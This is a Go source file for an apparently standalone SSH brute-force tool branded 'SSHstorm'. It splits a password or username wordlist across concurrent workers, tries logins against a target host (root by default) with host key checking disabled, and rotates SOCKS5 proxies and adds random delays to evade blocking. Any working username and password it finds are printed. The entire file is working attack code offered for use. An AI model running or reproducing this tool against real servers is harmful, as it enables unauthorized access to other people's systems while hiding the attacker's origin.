package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var sem = make(chan struct{}, 1)
var wg sync.WaitGroup
var operationDone = false
var globalProxy ProxySettings
var proxies []ProxySettings
var useProxyList = false

type ProxySettings struct {
	ip       string
	port     int
	username string
	password string
}

func CustomDialTimeout(network, address string, timeout time.Duration, proxySetting ProxySettings) (net.Conn, error, bool) {
	d := net.Dialer{Timeout: timeout}
	if proxySetting.ip == "" {
		conn, err := d.Dial(network, address)
		return conn, err, false
	}
	var auth *proxy.Auth = nil
	if proxySetting.username != "" {
		auth = &proxy.Auth{
			User:     proxySetting.username,
			Password: proxySetting.password,
		}
	}
	dialSocksProxy, err := proxy.SOCKS5("tcp", proxySetting.ip+":"+strconv.Itoa(proxySetting.port), auth, &d)
	if err != nil {
		return nil, err, true
	}
	conn, err := dialSocksProxy.Dial(network, address)
	return conn, err, false
}

func CustomDial(network, addr string, config *ssh.ClientConfig, proxySetting ProxySettings) (*ssh.Client, error, bool) {
	conn, err, rotate := CustomDialTimeout(network, addr, config.Timeout, proxySetting)
	if err != nil {
		return nil, err, rotate
	}
	c, channels, reqs, err := ssh.NewClientConn(conn, addr, config)
	if err != nil {
		rotate = !strings.Contains(fmt.Sprint(err), "ssh: unable to authenticate, attempted methods")
		return nil, err, rotate
	}
	return ssh.NewClient(c, channels, reqs), nil, false
}

func sshLogin(addr string, username string, password string, timeout int64, proxySetting ProxySettings) (bool, bool) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.HostKeyCallback(func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }),
		Timeout:         time.Duration(timeout * int64(time.Second)),
	}
	client, err, rotate := CustomDial("tcp", addr, config, proxySetting)
	if err != nil {
		return false, rotate
	}
	_ = client.Close()
	return true, false
}

func runWordlistPart(addr string, list []string, username string, timeout int64, inverted bool) {
	time.Sleep(time.Duration(rand.Float64() * float64(time.Second)))
	localProxy := globalProxy
	if useProxyList {
		localProxy = proxies[rand.Intn(len(proxies))]
	}
	for _, wordlistline := range list {
		time.Sleep(time.Duration(rand.Float64() * float64(time.Second) / 2))
		if operationDone {
			break
		}
		usr := username
		pwd := wordlistline
		if inverted {
			usr = wordlistline
			pwd = username
		}
		result, rotateProxy := sshLogin(addr, usr, pwd, timeout, localProxy)
		if !result && useProxyList && rotateProxy {
			fmt.Println("Rotating proxy!")
			localProxy = proxies[rand.Intn(len(proxies))]
			continue
		}
		if result {
			fmt.Println("================================")
			fmt.Println(" Found working combo")
			fmt.Println(" Username: " + usr)
			fmt.Println(" Password: " + pwd)
			fmt.Println("================================")
			sem <- struct{}{}
			operationDone = true
			<-sem
			break
		}
	}
	sem <- struct{}{}
	wg.Done()
	<-sem
}

func readLinesOfFile(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	s := bufio.NewScanner(f)
	s.Split(bufio.ScanLines)
	var lines []string
	for s.Scan() {
		lines = append(lines, s.Text())
	}
	_ = f.Close()
	return lines, nil
}

func readWordlist(filename string, workerCount int) ([][]string, int, error) {
	lines, err := readLinesOfFile(filename)
	if err != nil {
		return nil, 0, err
	}
	lineCount := len(lines)
	var result [][]string
	partLength := lineCount / workerCount
	if partLength == 0 {
		return nil, 0, fmt.Errorf("error while worker assigment: more or equal worker assigned than wordlist entries")
	}
	count := 0
	for i := 0; i < lineCount; i += partLength {
		customLen := partLength
		if i+customLen > lineCount {
			customLen = lineCount - i
		}
		result = append(result, lines[i:i+customLen])
		count++
	}
	return result, lineCount, nil
}

func readProxyList(filename string) ([]ProxySettings, int, error) {
	lines, err := readLinesOfFile(filename)
	if err != nil {
		return nil, 0, err
	}
	var proxies_ []ProxySettings
	for _, line := range lines {
		proxyEntry := ProxySettings{}
		proxyData := strings.Split(line, " ")
		if len(proxyData) == 0 {
			fmt.Println("not valid proxy-line found: " + line + " should be 'ip:port' or 'ip:port username:password'")
			continue
		}
		proxyPortStr := ""
		proxyEntry.ip, proxyPortStr, err = parseSyntax(proxyData[0])
		proxyPort, interr := strconv.Atoi(proxyPortStr)
		if err != nil || interr != nil {
			fmt.Println("not valid proxy-line found: " + line + " should be 'ip:port' or 'ip:port username:password'")
			continue
		}
		proxyEntry.port = proxyPort

		if len(proxyData) == 2 && proxyEntry.ip != "" && proxyData[1] != "" {
			proxyEntry.username, proxyEntry.password, err = parseSyntax(proxyData[1])
			if err != nil {
				fmt.Println("not valid proxy-line found: " + line + " should be 'ip:port' or 'ip:port username:password'")
				continue
			}
		}
		proxies_ = append(proxies_, proxyEntry)
	}
	return proxies_, len(lines), nil
}

func parseSyntax(text string) (string, string, error) {
	pos := strings.Index(text, ":")
	if pos != -1 {
		part1 := text[0:pos]
		part2 := text[pos+1:]
		return part1, part2, nil
	}
	return "", "", fmt.Errorf("not valid proxy-line found: " + text + " should be 'xxxx:xxxxx'")
}

func main() {
	addr := "127.0.0.1"
	port := 22
	username := "root"
	wordlistPath := "./smalllist.txt"
	proxiesPath := "./socket5_proxies.txt"
	workerCount := 10
	timeout := 3
	inverted := false
	globalProxy = ProxySettings{ip: "", port: 0}
	proxyaddr := ""
	proxycreds := ""

	flag.StringVar(&addr, "d", "127.0.0.1", "Specify Hostname or ip. Default is 127.0.0.1")
	flag.IntVar(&port, "p", 22, "Specify Port. Default is 22")
	flag.StringVar(&username, "u", "root", "Specify username or password (depends on inverted flag). Default is root")
	flag.IntVar(&workerCount, "c", 22, "Specify Worker count. Default is 10")
	flag.IntVar(&timeout, "t", 3, "Specify Timeout. Default is 3")
	flag.BoolVar(&inverted, "i", false, "Specify Inversion mode, bruteforce username with one password. Default is false")
	flag.StringVar(&wordlistPath, "w", "./smalllist.txt", "Specify wordlist. Default is ./smalllist.txt")
	flag.StringVar(&proxiesPath, "proxies", "", "Specify proxy list. Default is empty")
	flag.StringVar(&proxyaddr, "proxy", "", "Specify proxy in format ip:port. Default is no proxy usage")
	flag.StringVar(&proxycreds, "proxy-credentials", "", "Specify proxy credentials in format username:password. Default is empty")
	flag.Usage = func() {
		flag.PrintDefaults() // prints default usage
	}
	flag.Parse()

	if proxyaddr != "" {
		proxyIp, proxyPortStr, err := parseSyntax(proxyaddr)
		proxyPort, interr := strconv.Atoi(proxyPortStr)
		if err != nil || interr != nil {
			fmt.Println("not valid proxy-line found: " + proxyaddr + " should be 'ip:port' or 'ip:port username:password'")
			os.Exit(1)
			return
		}
		globalProxy.ip = proxyIp
		globalProxy.port = proxyPort
		if proxycreds != "" {
			globalProxy.username, globalProxy.password, err = parseSyntax(proxycreds)
			if err != nil {
				fmt.Println("not valid proxy-line found: " + proxycreds + " should be 'ip:port' or 'ip:port username:password'")
				os.Exit(1)
				return
			}
		}
	}
	usedProxies := 0

	if proxiesPath != "" {
		proxiesTmp, count, err := readProxyList(proxiesPath)
		if err != nil {
			fmt.Println(" Error while parsing the proxy list file")
			os.Exit(1)
			return
		}
		useProxyList = true
		proxies = proxiesTmp
		usedProxies = count
	}

	fmt.Println("                                                                                        ")
	fmt.Println("  _|_|_|_|  _|_|_|_|  _|    _|    _|_|_|    _|                                          ")
	fmt.Println("  _|        _|        _|    _|  _|        _|_|_|_|    _|_|    _|  _|_|  _|_|_|  _|_|    ")
	fmt.Println("  _|_|_|    _|_|_|    _|_|_|_|    _|_|      _|      _|    _|  _|_|      _|    _|    _|  ")
	fmt.Println("        _|        _|  _|    _|        _|    _|      _|    _|  _|        _|    _|    _|  ")
	fmt.Println("  _|_|_|    _|_|_|    _|    _|  _|_|_|        _|_|    _|_|    _|        _|    _|    _|  ")
	fmt.Println("                                                                                        ")
	fmt.Println(" Author: cli-ish                                                                        ")
	fmt.Println(" Target   : " + addr)
	fmt.Println(" Port     : " + strconv.Itoa(port))
	fmt.Println(" Timeout  : " + strconv.Itoa(timeout))
	fmt.Println(" username : " + username)
	fmt.Println(" workers  : " + strconv.Itoa(workerCount))
	fmt.Println(" wordlist : " + wordlistPath)
	fmt.Println(" Inverted : " + strconv.FormatBool(inverted))
	fmt.Println(" ProxyPath: " + proxiesPath)
	fmt.Println(" Loaded ^ : " + strconv.Itoa(usedProxies))
	if globalProxy.ip != "" {
		fmt.Println(" ============= Proxy  ============= ")
		fmt.Println(" ip       : " + globalProxy.ip)
		fmt.Println(" port     : " + strconv.Itoa(globalProxy.port))
		if globalProxy.username != "" {
			fmt.Println(" username : " + globalProxy.username)
			fmt.Println(" password : " + globalProxy.password)
		}
		fmt.Println(" ============= Proxy  ============= ")
	}
	fmt.Println(" Type -h for help")
	fmt.Println()

	target := addr + ":" + strconv.Itoa(port)
	fmt.Println(" Load Wordlist: " + wordlistPath)
	wordLists, lineCount, err := readWordlist(wordlistPath, workerCount)
	if err != nil {
		fmt.Println(" Wordlist could not be found!")
		os.Exit(1)
		return
	}
	wg.Add(workerCount)
	fmt.Println(" Start " + strconv.Itoa(workerCount) + " wordlist workers...")
	for _, wordlist := range wordLists {
		go runWordlistPart(target, wordlist, username, int64(timeout), inverted)
	}
	fmt.Println(" Started you can now get some coffee")
	now := time.Now()
	fmt.Println(" Start time: " + now.Format("01-02-2006 15:04:05"))
	halfway := now.Add(time.Duration(((timeout*lineCount)/2)/workerCount) * time.Second)
	fmt.Println(" Halfway wait-time possible: " + halfway.Format("01-02-2006 15:04:05"))
	fullWait := now.Add(time.Duration((timeout*lineCount)/workerCount) * time.Second)
	fmt.Println(" Longest wait-time possible: " + fullWait.Format("01-02-2006 15:04:05"))
	wg.Wait()
	fmt.Println(" Done with the working!")
	now = time.Now()
	fmt.Println(" End time: " + now.Format("01-02-2006 15:04:05"))
	return
}
